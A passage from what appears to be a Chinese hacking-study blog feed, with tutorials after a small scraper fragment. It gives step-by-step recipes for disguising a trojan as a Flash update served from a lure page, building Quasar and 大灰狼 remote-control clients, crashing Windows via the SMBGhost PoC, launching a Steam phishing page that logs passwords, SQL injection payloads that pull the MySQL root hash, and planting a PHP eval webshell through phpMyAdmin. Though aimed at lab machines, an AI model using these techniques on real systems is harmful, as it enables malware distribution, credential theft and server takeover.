open(json_name,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">        fp.write(contect)</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    start_page=int(input(&quot;请融入起始页：&quot;))</span><br><span class="line">    end_page=int(input(&quot;请输入结尾页：&quot;))</span><br><span class="line">    if(start_page&lt;1 or end_page&lt;start_page):</span><br><span class="line">        print(&quot;输入错误！&quot;)</span><br><span class="line">    else:</span><br><span class="line">        for page in range(start_page, end_page+1):</span><br><span class="line">            request=get_request(page)</span><br><span class="line">            contect=get_contect(request)</span><br><span class="line">            down_load(page,contect)</span><br><span class="line">        print(&quot;下载kfc店铺&quot;+str(start_page)+&quot;~&quot;+str(end_page)+&quot;页完成！&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot;&gt;&lt;a href=&quot;#爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot; class=&quot;headerlink&quot; title=&quot;爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十，网页注入捆绑木马</title>
    <link href="http://example.com/2023/11/29/%E4%BA%8C%E5%8D%81%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B3%A8%E5%85%A5%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC/"/>
    <id>http://example.com/2023/11/29/%E4%BA%8C%E5%8D%81%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B3%A8%E5%85%A5%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC/</id>
    <published>2023-11-29T12:36:24.000Z</published>
    <updated>2023-11-29T13:06:21.920Z</updated>
    
    <content type="html"><![CDATA[<p>1，先制作一个flash页面加入flash升级弹窗</p><p>下载好flash.js文件，先制作一个简单页面在body标签中加入以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292044323.png" alt="image-20231129204430323"></p><p>2，制作捆绑木马</p><p>将flashcenter_pp_ax_install_cn.exe安装包和flag.exe木马放在同一文件夹下</p><p>使⽤winrar选中两个文件创建压缩⽂件</p><p>选中 创建自解压格式压缩文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292048736.png" alt="image-20231129204809684"></p><p>⾼级-&gt;⾼级⾃解压选项，路径设置 C:\windows\temp</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292049081.png" alt="image-20231129204928461"></p><p>在设置添加<br>C:\windows\temp\flashcenter_pp_ax_install_cn.exe<br>C:\windows\temp\flag.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292050897.png" alt="image-20231129205010088"></p><p>模式设置全部隐藏</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292050470.png" alt="image-20231129205045192"></p><p>更新设置</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292051436.png" alt="image-20231129205111322"></p><p>在最后点击确定，点击生成</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292054689.png" alt="image-20231129205428438"></p><p>3，替换图标</p><p>先下载Restorator.rar文件并进行解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292055603.png" alt="image-20231129205534521"></p><p>双击Restorator.exe运行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292056692.png" alt="image-20231129205623567"></p><p>将Desktop.exe和flashcenter_pp_ax_install_cn.exe都拖到Restorator的资源数中</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292058432.png" alt="image-20231129205805145"></p><p>将Desktop.exe的图标删除，将flashcenter_pp_ax_install_cn.exe的图标复制黏贴到Desktop.exe中</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292059560.png" alt="image-20231129205927369"></p><p>点击保存退出并将Desktop.exe重命名为flash.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292100474.png" alt="image-20231129210023351"></p><p>4，将捆绑木马放到网页中</p><p>先将flash.exe放到网站根目录中</p><p>并在flash.js的最后改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.96/flash.exe</span><br></pre></td></tr></table></figure><p>其中192.168.2.96为本机的IP地址，flash.exe为改好的安装包文件</p><p>在网页中点击立即升级，开始下载flash.exe文件说明放入捆绑木马成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292105253.png" alt="image-20231129210530876"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，先制作一个flash页面加入flash升级弹窗&lt;/p&gt;
&lt;p&gt;下载好flash.js文件，先制作一个简单页面在body标签中加入以下代码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十九，Quasar远控的安装及使用</title>
    <link href="http://example.com/2023/11/29/%E5%8D%81%E4%B9%9D%EF%BC%8CQuasar%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/29/%E5%8D%81%E4%B9%9D%EF%BC%8CQuasar%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-29T12:18:35.000Z</published>
    <updated>2023-11-29T12:32:02.435Z</updated>
    
    <content type="html"><![CDATA[<p>1，关闭系统中所有的杀毒软件与防火墙</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292020610.png" alt="image-20231129202009585" style="zoom:67%;" /><p>2，下载Quasar最新内部成员汉化版远控工具.rar并解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292021455.png" alt="image-20231129202153099"></p><p>3，双击运行Quasar_zh-CHS.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292022917.png" alt="image-20231129202238345"></p><p>4，开启监听端口</p><p>点击设置—&gt;选择端口4782—&gt;点击Start Listening—&gt;保存</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292024265.png" alt="image-20231129202418255"></p><p>5，生成控制程序，点击生成进行以下设置</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292025392.png" alt="image-20231129202555179" style="zoom: 67%;" /><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292026137.png" alt="image-20231129202630109"></p><p>点击生成，成功生成程序Client-built.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292027394.png" alt="image-20231129202722155"></p><p>6，将程序Client-built.exe拖到虚拟机中双击运行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292029008.png" alt="image-20231129202951870"></p><p>7，右键管理可以进行多种操作</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292030749.png" alt="image-20231129203041363"></p><p>8，点击断开可以退出远程控制</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292031324.png" alt="image-20231129203125167"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，关闭系统中所有的杀毒软件与防火墙&lt;/p&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292020610.png&quot; alt=&quot;image-20231129202009585&quot; s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十八，大灰狼远控软件的使用</title>
    <link href="http://example.com/2023/11/28/%E5%8D%81%E5%85%AB%EF%BC%8C%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/28/%E5%8D%81%E5%85%AB%EF%BC%8C%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-28T12:17:53.000Z</published>
    <updated>2023-11-28T12:34:26.554Z</updated>
    
    <content type="html"><![CDATA[<p>1，下载下载DHLv9.5.zip并进行解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282034897.png" alt="image-20231128203410405"></p><p>2，双击运行大灰狼远程管理软件 V9.5.exe文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282019750.png" alt="image-20231128201951397"></p><p>3，点击服务生成，在域名IP中输入本机的IP地址，并点击生成服务</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282029725.png" alt="image-20231128202931604"></p><p>4，将生成的Server.exe文件拖到虚拟机中双击运行后返回大灰狼管理软件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282031299.png" alt="image-20231128203103865"></p><p>出现以上结果表示远控成功，可以右键进行多种操作</p><p>python在执行程序时发现缺少某种包，则可用以下命令进行导入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install chardet -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，下载下载DHLv9.5.zip并进行解压&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282034897.png&quot; alt=&quot;image-2023112820341</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十七，永恒之黑和简单钓鱼页面</title>
    <link href="http://example.com/2023/11/28/%E5%8D%81%E4%B8%83%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%92%8C%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/"/>
    <id>http://example.com/2023/11/28/%E5%8D%81%E4%B8%83%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%92%8C%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/</id>
    <published>2023-11-28T11:45:01.000Z</published>
    <updated>2023-11-28T12:16:08.933Z</updated>
    
    <content type="html"><![CDATA[<h5 id="一，永恒之黑的简单复现"><a href="#一，永恒之黑的简单复现" class="headerlink" title="一，永恒之黑的简单复现"></a>一，永恒之黑的简单复现</h5><p>1，先对Windows系统是否存在永恒之黑进行进行检测</p><p>从<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> 这个网址下载检测工具</p><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796-Scanner.exe 192.168.2.128</span><br></pre></td></tr></table></figure><p>若出现以下效果则证明存在永恒之黑漏洞</p><p><img src="/../../../../../Users/Q/AppData/Roaming/Typora/typora-user-images/image-20231128194913268.png" alt="image-20231128194913268"></p><p>2，其次是对永恒之黑漏洞进行复现攻击</p><p>从<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a> 下载攻击工具</p><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.2.128</span><br></pre></td></tr></table></figure><p>若Windows系统的虚拟机出现蓝屏则证明对永恒之黑漏洞的攻击复现成功</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311281952658.png" alt="image-20231128195231534" style="zoom:80%;" /><p>二，钓鱼页面的简单制作</p><p>1，先在kali系统中开代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>进入配置文件中进行修改，修改最后一行为以下内容并保存退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 192.168.2.44 7897</span><br></pre></td></tr></table></figure><p>中间的数字为本机IP，后面的数字为代理端口</p><p>2，下载mip22</p><p>进入桌面，在命令窗口中执行以下命令进行下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 git clone https://github.com/makdosx/mip22</span><br></pre></td></tr></table></figure><p>3，生成钓鱼页面</p><p>进入mip22文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/kali/Desktop/mip22</span><br></pre></td></tr></table></figure><p>给mip22增加执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./*</span><br></pre></td></tr></table></figure><p>执行mip22，开始生成钓鱼页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q bash ./mip22.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282004666.png" alt="image-20231128200451131"></p><p>选择1默认配置页面</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282006157.png" alt="image-20231128200640695"></p><p>选择51，steam游戏平台的模板</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282008997.png" alt="image-20231128200808927"></p><p>选择3 Cloudflard，使其他用户在其他电脑也可以查看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282009127.png" alt="image-20231128200956963"></p><p>其中https的网址就是生成的钓鱼页面了</p><p><a href="https://remaining-img-questions-less.trycloudflare.com/">https://remaining-img-questions-less.trycloudflare.com</a> </p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282011477.png" alt="image-20231128201120608"></p><p>在mip22文件夹中的data.txt保存着在钓鱼页面中输入的账号和密码</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282014343.png" alt="image-20231128201411107"></p><p>在fingerprints.txt中保存着在钓鱼页面中尝试登录的用户的IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282015451.png" alt="image-20231128201525152"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;一，永恒之黑的简单复现&quot;&gt;&lt;a href=&quot;#一，永恒之黑的简单复现&quot; class=&quot;headerlink&quot; title=&quot;一，永恒之黑的简单复现&quot;&gt;&lt;/a&gt;一，永恒之黑的简单复现&lt;/h5&gt;&lt;p&gt;1，先对Windows系统是否存在永恒之黑进行进行检测&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十六，sql注入的简单使用</title>
    <link href="http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-23T11:10:10.000Z</published>
    <updated>2023-11-23T12:12:30.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="1，搭建Pikachu漏洞练习平台"><a href="#1，搭建Pikachu漏洞练习平台" class="headerlink" title="1，搭建Pikachu漏洞练习平台"></a>1，搭建Pikachu漏洞练习平台</h5><p>先解压pikachu-master.zip文件至先前搭建的网站根目录，再打开pikachu\inc目录下的config.inc.php</p><p>文件，并将第11行代码改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&#x27;DBPW&#x27;, &#x27;root&#x27;);</span><br></pre></td></tr></table></figure><p>保存后复制黏贴为config.inc文件</p><p>打开网址：<a href="http://192.168.2.31/pikachu/">http://192.168.2.31/pikachu/</a>  便可进入PIkachu漏洞联系平台</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231919074.png" alt="image-20231123191932069" style="zoom:67%;" /><h5 id="2，安装配置BurpSuite软件"><a href="#2，安装配置BurpSuite软件" class="headerlink" title="2，安装配置BurpSuite软件"></a>2，安装配置BurpSuite软件</h5><p>先解压BurpSuite v2.1中文版.zip，双击Start.vbs后在地址中输入cmd打开命令窗口输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java -jar burp-loader-keygen-2.jar</span><br></pre></td></tr></table></figure><p>后按照流程完成BurpSuite软件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231925901.png" alt="image-20231123192524600"></p><p>点击代理-&gt;选项-&gt;CA证明书再生成</p><p>打开网址：127.0.0.1:8080 点击CA Certificate下载证书文件cacert.der</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231927462.png" alt="image-20231123192732852"></p><p>在浏览器中点击设置-&gt;搜索证书-&gt;安全-&gt;管理证书-&gt;受信任的根证书颁发机构-&gt;导入证书即可</p><p>在GOogleChrome中的扩展插件SwitchyOmega中加入如下配置</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231932016.png" alt="image-20231123193255336"></p><h5 id="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"><a href="#3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入" class="headerlink" title="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"></a>3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入</h5><p>先打开BurpSuite软件和Pikachu漏洞练习平台</p><p>再在Pikachu漏洞练习平台选择SQL的数字型注入选项</p><p>在BurpSuite软件中点击代理-&gt;截断-&gt;拦截禁用</p><p>选择1，点击查询，会发现页面没有跳转并在BurpSuite中显示了相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231941303.png" alt="image-20231123194105141"></p><p>右键发送给Repeater后管理关闭拦截请求后再重发器中可以看到相关信息，进行更改后可点击发送</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231943739.png" alt="image-20231123194356916"></p><p>数字型注入可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</p><p>在请求体最底下进行更改id&#x3D; 2 and 1&#x3D;1</p><p>页面依旧运行正常，继续进行下一步。</p><p>改为id&#x3D; 2 and 1&#x3D;2</p><p>页面运行错误，则说明此 Sql 注入为数字型注入。</p><p>改为id&#x3D;10 or 1 便可查询该表中的所有信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231947066.png" alt="image-20231123194713861"></p><p>因为在MySQL5.0以上会有一个information_schema数据库来记载所有数据库和表以及列的信息，所有可以针对该点进行查询</p><p>information_schema数据库结构如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231952626.png" alt="image-20231123195236735" style="zoom:67%;" /><p>在请求头输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select schema_name from information_schema.schemata limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询有哪些数据库，查到有数据库名为mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select table_name from information_schema.tables where table_name=&#x27;mysql&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询mysql数据库中有那些表，其中有user表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select column_name from information_schema.columns where table_name=&#x27;mysql&#x27; table_name=&#x27;user&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询user表中有哪些字段，查询到了有User用户名和authentication_string密码字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select authentication_string from mysql.user where  User=&#x27;root&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>可以查询到user表中的root管理员用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001971.png" alt="image-20231123200104745"></p><p>在MD5在线解密网站解密如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001081.png" alt="image-20231123200153119" style="zoom:67%;" /><h5 id="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"><a href="#4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入" class="headerlink" title="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"></a>4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入</h5><p>如数字型注入一样在BurpSuite中对网页的请求进行拦截</p><p>可以使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断：</p><p>在请求栏中更改id&#x3D; x’ and ‘1’&#x3D;’1</p><p>页面运行正常，继续进行下一步。</p><p>若id&#x3D; x’ and ‘1’&#x3D;’2</p><p>页面运行错误，则说明此 Sql 注入为字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27;union select 1,database()-- -</span><br></pre></td></tr></table></figure><p>可获取该数据库的名称</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232009500.png" alt="image-20231123200945828" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27; or &#x27;1=1&#x27;-- -</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232011759.png" alt="image-20231123201059324" style="zoom:67%;" /><p>便可获取该表中的所有数据</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;a href=&quot;#1，搭建Pikachu漏洞练习平台&quot; class=&quot;headerlink&quot; title=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;/a&gt;1，搭建Pikachu漏洞练习平台&lt;/h5&gt;&lt;p&gt;先解压pikachu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十五，通过phpmyadmin获取靶机的控制</title>
    <link href="http://example.com/2023/11/22/%E5%8D%81%E4%BA%94%EF%BC%8C%E9%80%9A%E8%BF%87phpmyadmin%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%8E%A7%E5%88%B6/"/>
    <id>http://example.com/2023/11/22/%E5%8D%81%E4%BA%94%EF%BC%8C%E9%80%9A%E8%BF%87phpmyadmin%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%8E%A7%E5%88%B6/</id>
    <published>2023-11-22T12:27:15.000Z</published>
    <updated>2023-11-22T12:50:30.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="通过phpMyAdmin获取靶机的控制，要满足以下三个条件："><a href="#通过phpMyAdmin获取靶机的控制，要满足以下三个条件：" class="headerlink" title="通过phpMyAdmin获取靶机的控制，要满足以下三个条件："></a>通过phpMyAdmin获取靶机的控制，要满足以下三个条件：</h6><p>1，获取root权限<br>2，获取网站的根目录绝对路径<br>3，secure_file_priv为空</p><h6 id="以下是获取控制的实现步骤："><a href="#以下是获取控制的实现步骤：" class="headerlink" title="以下是获取控制的实现步骤："></a>以下是获取控制的实现步骤：</h6><p>1，在小皮面板中下载phpMyAdmin</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122185038051.png" alt="image-20231122185038051" style="zoom: 67%;" /><p>2，在浏览器中输入网址：（<a href="http://localhost/phpMyAdmin4.8.5/%EF%BC%89%E8%BF%9B%E5%85%A5%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2">http://localhost/phpMyAdmin4.8.5/）进入管理页面</a></p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122185340225.png" alt="image-20231122185340225" style="zoom:67%;" /><p>3，输入数据库的账号和密码进行登录</p><p>4，查看MySQL数据库服务器中系统变量（secure_file_priv）是否为Null</p><p>点击sql，输入命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122185848677.png" alt="image-20231122185848677" style="zoom:67%;" /><p>5，开启全局日志记录，更改全局日志文件</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure><p>查看全局日志文件是否开启</p><p>OFF表示未打开，ON表示已开启</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=ON </span><br></pre></td></tr></table></figure><p> 开启全局日志记录</p><p>显示成功后再次输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure><p>查看全局日志</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122190436135.png" alt="image-20231122190436135" style="zoom:67%;" /><p>6，更改全局日志文件</p><p>在C:\phpstudy_pro\WWW(默认地址)的目录下新建一个空的php文件</p><p>将日志文件路径更改为刚刚新建的php文件目录</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&quot;C:/phpstudy_pro/WWW/phpmuma.php&quot;</span><br></pre></td></tr></table></figure><p>“&#x3D;”号后面的是你的新建php文件的路径</p><p>成功执行后再次输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure><p>查看全局日志询看是否修改成功</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122191412808.png" alt="image-20231122191412808" style="zoom:67%;" /><p>7，关闭防火墙</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122191851150.png" alt="image-20231122191851150" style="zoom:67%;" /><p>8，在phpmuma文件里写入phpinfo</p><p>在输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;? phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure><p> 命令 在phpmuma文件里写入phpinfo</p><p>在phpmuma文件里看到这些</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122192109565.png" alt="image-20231122192109565" style="zoom:67%;" /><p>打开浏览器访问phpmuma文件</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122192253372.png" alt="image-20231122192253372" style="zoom:67%;" /><p>表示已成功写入phpinfo，可以在该页面下找到该网站根目录的绝对路径</p><p>9，使用一句话木马对网站进行植入</p><p>在phpMyAdmin里输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT&quot; &lt;?php @eval($_POST[“cmd”]);?&gt;&quot;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122192747259.png" alt="image-20231122192747259" style="zoom:67%;" /><p>10，下载并打开剑蚁进行配置</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122193757669.png" alt="image-20231122193757669" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122193321602.png" alt="image-20231122193321602"></p><p>11，双击后出现如下界面则表示控制成功！</p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122193843719.png" alt="image-20231122193843719" style="zoom:67%;" /><hr>]]></content>
    
    
      
      
